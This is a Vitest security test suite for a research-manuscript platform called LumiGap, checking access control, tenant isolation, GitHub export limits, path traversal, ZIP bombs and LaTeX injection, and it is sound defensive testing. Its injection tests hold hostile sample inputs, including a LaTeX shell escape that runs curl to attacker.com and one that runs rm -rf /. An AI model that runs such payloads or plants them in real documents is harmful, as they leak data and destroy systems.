import { beforeEach, describe, expect, it, vi } from "vitest";
import { zipSync, strToU8 } from "fflate";
import { AppError } from "../../../common/exceptions/app-error.js";
import { assertCanExportProjectSource, researchLedgerService } from "../../audit/research-ledger.service.js";
import { manuscriptPath } from "../../workspaces/manuscript-source.js";
import { readSourceZip } from "../../workspaces/manuscript-import.js";
import { validateManuscriptProposal } from "../../workspaces/manuscript-ai-policy.js";
import { manuscriptEvents } from "../../workspaces/manuscript-events.js";

// Mocks for database and external providers
const mocks = vi.hoisted(() => ({
  user: { findUnique: vi.fn(), findMany: vi.fn() },
  project: { findUnique: vi.fn(), findUniqueOrThrow: vi.fn() },
  projectMember: { findUnique: vi.fn(), findFirst: vi.fn(), count: vi.fn() },
  projectPaper: { findUnique: vi.fn(), findFirst: vi.fn() },
  researchGap: { findFirst: vi.fn() },
  projectEvidenceItem: { findFirst: vi.fn() },
  gapEvidenceRecord: { findUnique: vi.fn() },
  mentorRelationship: { count: vi.fn() },
  researchEvidenceEvent: { create: vi.fn(), findMany: vi.fn() },
  auditLog: { create: vi.fn() },
  githubConnection: { findUnique: vi.fn(), upsert: vi.fn() },
  githubProvider: vi.fn(),
}));

vi.mock("../../../infrastructure/database/prisma.js", () => ({
  getPrisma: () => ({
    user: mocks.user,
    project: mocks.project,
    projectMember: mocks.projectMember,
    projectPaper: mocks.projectPaper,
    researchGap: mocks.researchGap,
    projectEvidenceItem: mocks.projectEvidenceItem,
    gapEvidenceRecord: mocks.gapEvidenceRecord,
    mentorRelationship: mocks.mentorRelationship,
    researchEvidenceEvent: mocks.researchEvidenceEvent,
    auditLog: mocks.auditLog,
    githubConnection: mocks.githubConnection,
  }),
}));

vi.mock("../../../infrastructure/redis.js", () => ({
  redis: {
    get: vi.fn().mockResolvedValue(null),
    set: vi.fn().mockResolvedValue("OK"),
    del: vi.fn().mockResolvedValue(1),
  },
}));

vi.mock("../../github/github.http.js", () => ({
  githubJson: (...args: unknown[]) => mocks.githubProvider(...args),
  GithubHttpError: class extends Error {
    constructor(public status: number, message: string) {
      super(message);
    }
  },
}));

vi.mock("../../github/github.crypto.js", () => ({
  openGithubToken: (val: string) => `decrypted-${val}`,
  sealGithubToken: (val: string) => `encrypted-${val}`,
}));

import { githubService } from "../../github/github.service.js";
import { assertWorkspaceLink } from "../../projects/workspace-access.js";
import { projectService } from "../../projects/project.service.js";

describe("OWASP Security Hardening Suite for LumiGap", () => {
  const OWNER_ID = "11111111-1111-4111-8111-111111111111";
  const MEMBER_ID = "22222222-2222-4222-8222-222222222222";
  const OUTSIDER_ID = "33333333-3333-4333-8333-333333333333";
  const PROJECT_ID = "44444444-4444-4444-8444-444444444444";

  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe("1. Access Control & Export Policy Enforcement (OWASP Top 10 A01:2025, ASVS V4)", () => {
    it("permits project owner to export source under OWNER_ONLY policy", () => {
      const project = { id: PROJECT_ID, ownerId: OWNER_ID, exportPolicy: "OWNER_ONLY" };
      expect(() => assertCanExportProjectSource(project, OWNER_ID)).not.toThrow();
    });

    it("blocks regular project member from exporting source under OWNER_ONLY policy", () => {
      const project = { id: PROJECT_ID, ownerId: OWNER_ID, exportPolicy: "OWNER_ONLY" };
      expect(() => assertCanExportProjectSource(project, MEMBER_ID)).toThrowError(
        /restricted to the project owner/,
      );
    });

    it("allows regular project member to export source under ALL_MEMBERS policy", () => {
      const project = { id: PROJECT_ID, ownerId: OWNER_ID, exportPolicy: "ALL_MEMBERS" };
      expect(() => assertCanExportProjectSource(project, MEMBER_ID)).not.toThrow();
    });

    it("defaults to ALL_MEMBERS if exportPolicy is null or undefined", () => {
      const project = { id: PROJECT_ID, ownerId: OWNER_ID, exportPolicy: null };
      expect(() => assertCanExportProjectSource(project, MEMBER_ID)).not.toThrow();
    });
  });

  describe("2. Cross-Project Resource Boundary (IDOR & Tenant Isolation)", () => {
    const mockContext = {
      tx: {
        projectPaper: mocks.projectPaper,
        researchGap: mocks.researchGap,
        projectEvidenceItem: mocks.projectEvidenceItem,
        gapEvidenceRecord: mocks.gapEvidenceRecord,
      } as any,
      project: { id: PROJECT_ID, ownerId: OWNER_ID } as any,
      actorId: MEMBER_ID,
      role: "MEMBER" as const,
    };

    it("accepts valid resource link belonging to the current project", async () => {
      mocks.projectPaper.findUnique.mockResolvedValueOnce({ id: "link-1", projectId: PROJECT_ID, paperId: "paper-1" });
      await expect(assertWorkspaceLink(mockContext, { kind: "PAPER", id: "paper-1" })).resolves.toBeUndefined();
    });

    it("rejects resource link when paper does not belong to the project", async () => {
      mocks.projectPaper.findUnique.mockResolvedValueOnce(null);
      await expect(assertWorkspaceLink(mockContext, { kind: "PAPER", id: "foreign-paper" })).rejects.toThrowError(
        /does not belong to this project/,
      );
    });

    it("rejects evidence record belonging to a different project gap", async () => {
      mocks.projectEvidenceItem.findFirst.mockResolvedValueOnce(null);
      mocks.gapEvidenceRecord.findUnique.mockResolvedValueOnce({ id: "ev-1", gapId: "foreign-gap" });
      mocks.researchGap.findFirst.mockResolvedValueOnce(null); // foreign gap not in this project

      await expect(assertWorkspaceLink(mockContext, { kind: "EVIDENCE", id: "ev-1" })).rejects.toThrowError(
        /does not belong to this project/,
      );
    });
  });

  describe("3. GitHub Integration Confidentiality & Export Hardening", () => {
    beforeEach(() => {
      mocks.user.findUnique.mockResolvedValue({ id: MEMBER_ID, isActive: true, accountStatus: "ACTIVE" });
      mocks.githubConnection.findUnique.mockResolvedValue({
        userId: MEMBER_ID,
        encryptedAccessToken: "test-token",
        expiresAt: new Date(Date.now() + 3600000),
      });
    });

    it("rejects GitHub write operations (POST/PATCH) that omit projectId", async () => {
      await expect(
        githubService.request(MEMBER_ID, {
          repository: "research-org/paper-repo",
          path: "/git/blobs",
          method: "POST",
          body: { content: "dGVzdA==", encoding: "base64" },
        }),
      ).rejects.toThrowError(/Project identifier is required/);
    });

    it("blocks member without export permission from pushing to GitHub", async () => {
      mocks.project.findUnique.mockResolvedValueOnce({
        id: PROJECT_ID,
        ownerId: OWNER_ID,
        visibility: "PRIVATE",
        exportPolicy: "OWNER_ONLY",
      });
      mocks.projectMember.findFirst.mockResolvedValueOnce({
        projectId: PROJECT_ID,
        userId: MEMBER_ID,
        status: "ACTIVE",
      });

      await expect(
        githubService.request(MEMBER_ID, {
          repository: "research-org/paper-repo",
          path: "/git/blobs",
          method: "POST",
          projectId: PROJECT_ID,
          body: { content: "dGVzdA==", encoding: "base64" },
        }),
      ).rejects.toThrowError(/restricted to the project owner/);
    });

    it("blocks exporting private project manuscript to a public GitHub repository", async () => {
      mocks.user.findUnique.mockResolvedValue({ id: OWNER_ID, isActive: true, accountStatus: "ACTIVE" });
      mocks.githubConnection.findUnique.mockResolvedValue({
        userId: OWNER_ID,
        encryptedAccessToken: "owner-token",
        expiresAt: new Date(Date.now() + 3600000),
      });
      mocks.project.findUnique.mockResolvedValueOnce({
        id: PROJECT_ID,
        ownerId: OWNER_ID,
        visibility: "PRIVATE",
        exportPolicy: "OWNER_ONLY",
      });
      mocks.projectMember.findFirst.mockResolvedValueOnce(null);

      // GitHub returns public repo
      mocks.githubProvider.mockResolvedValueOnce({
        full_name: "research-org/public-repo",
        private: false,
      });

      await expect(
        githubService.request(OWNER_ID, {
          repository: "research-org/public-repo",
          path: "/git/blobs",
          method: "POST",
          projectId: PROJECT_ID,
          body: { content: "dGVzdA==", encoding: "base64" },
        }),
      ).rejects.toThrowError(/Cannot export private project manuscript to a public repository/);
    });

    it("allows push when project is private and repository is private, recording audit event on ref update", async () => {
      mocks.user.findUnique.mockResolvedValue({ id: OWNER_ID, isActive: true, accountStatus: "ACTIVE" });
      mocks.githubConnection.findUnique.mockResolvedValue({
        userId: OWNER_ID,
        encryptedAccessToken: "owner-token",
        expiresAt: new Date(Date.now() + 3600000),
      });
      mocks.project.findUnique.mockResolvedValueOnce({
        id: PROJECT_ID,
        ownerId: OWNER_ID,
        visibility: "PRIVATE",
        exportPolicy: "OWNER_ONLY",
      });

      // GitHub repo is private
      mocks.githubProvider.mockResolvedValueOnce({
        full_name: "research-org/private-repo",
        private: true,
      });
      // GitHub ref creation returns success
      mocks.githubProvider.mockResolvedValueOnce({
        ref: "refs/heads/main",
        object: { sha: "a".repeat(40) },
      });

      const result = await githubService.request(OWNER_ID, {
        repository: "research-org/private-repo",
        path: "/git/refs",
        method: "POST",
        projectId: PROJECT_ID,
        body: { ref: "refs/heads/main", sha: "a".repeat(40) },
      });

      expect(result).toBeDefined();
      expect(mocks.researchEvidenceEvent.create).toHaveBeenCalledWith(
        expect.objectContaining({
          data: expect.objectContaining({
            projectId: PROJECT_ID,
            actorId: OWNER_ID,
            eventType: "MANUSCRIPT_SOURCE_EXPORTED",
            resourceKind: "GITHUB_REPOSITORY",
            resourceId: "research-org/private-repo",
          }),
        }),
      );
    });
  });

  describe("4. Path Traversal & File Upload Defenses (OWASP Top 10 A03:2025)", () => {
    it.each([
      "../secret.tex",
      "a/../../secret.tex",
      "/absolute/path.tex",
      "lumigap-build/output.tex",
      "LUMIGAP-BUILD/bad.tex",
      "folder/../bad.tex",
      "trailing-space/file.tex ",
      "invalid*char.tex",
    ])("rejects dangerous or traversing manuscript path: %s", (path) => {
      expect(() => manuscriptPath(path, "TEXT")).toThrowError(AppError);
    });

    it("permits canonical sanitized manuscript paths", () => {
      expect(manuscriptPath("main.tex", "TEXT")).toBe("main.tex");
      expect(manuscriptPath("sections/introduction.tex", "TEXT")).toBe("sections/introduction.tex");
      expect(manuscriptPath("figures/figure1.png", "ASSET")).toBe("figures/figure1.png");
    });

    it("rejects ZIP archives with directory traversal or invalid paths", () => {
      const zip = zipSync({
        "main.tex": strToU8("\\documentclass{article}\\begin{document}Test\\end{document}"),
        "../escaped.tex": strToU8("malicious content"),
      });

      expect(() => readSourceZip(zip, "main.tex")).toThrow();
    });

    it("rejects ZIP bomb attempts with abnormal compression or uncompressed sizes", () => {
      const hugeContent = new Uint8Array(600_000); // Exceeds MAX_TEXT_BYTES
      const zip = zipSync({
        "main.tex": strToU8("\\documentclass{article}\\begin{document}Test\\end{document}"),
        "huge.tex": hugeContent,
      });

      expect(() => readSourceZip(zip, "main.tex")).toThrow();
    });
  });

  describe("5. LaTeX AI Operation & Injection Defenses (ASVS V5)", () => {
    it.each([
      "Text \\write18{curl https://attacker.com/leak}",
      "Text \\immediate\\write18{rm -rf /}",
      "```latex\n\\section{Test}\n```",
      "\\newcommand{\\dangerous}{malicious}",
    ])("rejects LaTeX AI proposals with shell escape or macro injection: %s", (injected) => {
      expect(() => validateManuscriptProposal("custom", "Text", injected)).toThrow();
    });

    it("rejects AI suggestions attempting directory traversal in file inputs", () => {
      const fullSource = "\\input{sections/results}";
      const from = fullSource.indexOf("sections/results");
      const to = from + "sections/results".length;
      expect(() =>
        validateManuscriptProposal("custom", "sections/results", "../../secret", {
          fullSource,
          from,
          to,
          paths: ["sections/results.tex"],
        }),
      ).toThrow();
    });

    it("rejects AI continuations that fabricate unsupplied numerical findings", () => {
      const original = "Known experimental context.";
      expect(() =>
        validateManuscriptProposal(
          "continue",
          original,
          " Our benchmark achieved an unprecedented 99.8% precision score.",
          { fullSource: original, from: 0, to: original.length, paths: [] },
        ),
      ).toThrow();
    });
  });

  describe("6. Real-time Collaboration Session Revocation (ASVS V3, Top 10 A07:2025)", () => {
    it("emits member-revoked event on membership removal to terminate real-time editing sockets", () => {
      const listener = vi.fn();
      manuscriptEvents.on("member-revoked", listener);

      manuscriptEvents.emit("member-revoked", { projectId: PROJECT_ID, userId: MEMBER_ID });

      expect(listener).toHaveBeenCalledWith({ projectId: PROJECT_ID, userId: MEMBER_ID });
      manuscriptEvents.off("member-revoked", listener);
    });
  });

  describe("7. Security Audit Overview & Contribution Ledger Access (OWASP Top 10 A09:2025)", () => {
    beforeEach(() => {
      mocks.user.findUnique.mockImplementation(({ where }) => {
        const id = where.id;
        if (id === OWNER_ID) return Promise.resolve({ id: OWNER_ID, isActive: true, accountStatus: "ACTIVE", systemRole: "USER" });
        if (id === MEMBER_ID) return Promise.resolve({ id: MEMBER_ID, isActive: true, accountStatus: "ACTIVE", systemRole: "USER" });
        if (id === OUTSIDER_ID) return Promise.resolve({ id: OUTSIDER_ID, isActive: true, accountStatus: "ACTIVE", systemRole: "USER" });
        return Promise.resolve(null);
      });

      mocks.project.findUnique.mockResolvedValue({
        id: PROJECT_ID,
        ownerId: OWNER_ID,
        visibility: "PRIVATE",
        exportPolicy: "OWNER_ONLY",
        status: "ACTIVE",
      });

      mocks.projectMember.count.mockResolvedValue(2);
      mocks.mentorRelationship.count.mockResolvedValue(0);
      mocks.researchEvidenceEvent.findMany.mockResolvedValue([]);
    });

    it("blocks outsider from viewing project security overview (returns 404)", async () => {
      mocks.projectMember.findUnique.mockResolvedValueOnce(null);

      await expect(
        researchLedgerService.getProjectSecurityOverview(PROJECT_ID, OUTSIDER_ID),
      ).rejects.toThrowError(/Project not found/);
    });

    it("restricts OWNER_ADMIN audit events when requested by non-owner member", async () => {
      mocks.projectMember.findUnique.mockResolvedValueOnce({
        projectId: PROJECT_ID,
        userId: MEMBER_ID,
        status: "ACTIVE",
      });

      await researchLedgerService.getProjectSecurityOverview(PROJECT_ID, MEMBER_ID);

      expect(mocks.researchEvidenceEvent.findMany).toHaveBeenCalledWith(
        expect.objectContaining({
          where: expect.objectContaining({
            visibility: { in: ["PROJECT_TEAM", "CONTRIBUTOR_SCOPED"] }, // OWNER_ADMIN excluded
          }),
        }),
      );
    });

    it("includes OWNER_ADMIN audit events when requested by project owner", async () => {
      mocks.projectMember.findUnique.mockResolvedValueOnce(null); // owner is not in projectMember table

      await researchLedgerService.getProjectSecurityOverview(PROJECT_ID, OWNER_ID);

      expect(mocks.researchEvidenceEvent.findMany).toHaveBeenCalledWith(
        expect.objectContaining({
          where: expect.objectContaining({
            visibility: { in: ["PROJECT_TEAM", "OWNER_ADMIN", "CONTRIBUTOR_SCOPED"] },
          }),
        }),
      );
    });
  });

  describe("8. Public Project Information Disclosure Hardening (Top 10 A02:2025)", () => {
    it("strips confidential members, private papers, activity logs and owner identity from public project summaries", async () => {
      mocks.project.findUnique.mockResolvedValueOnce({
        id: PROJECT_ID,
        title: "Confidential Breakthrough",
        publicSummary: "Public brief description",
        researchAreas: ["Artificial Intelligence"],
        status: "ACTIVE",
        visibility: "PUBLIC",
        ownerId: OWNER_ID,
        createdAt: new Date(),
        updatedAt: new Date(),
      });

      const summary = await projectService.getPublicProjectById(PROJECT_ID);

      expect(summary.isPublicSummary).toBe(true);
      expect(summary.title).toBe("Confidential Breakthrough");
      expect(summary.ownerId).toBe("");
      expect(summary.owner).toBeUndefined();
      expect(summary.members).toEqual([]);
      expect(summary.papers).toEqual([]);
      expect(summary.recentActivity).toEqual([]);
      expect(summary.memberCount).toBe(0);
      expect(summary.paperCount).toBe(0);
    });
  });
});
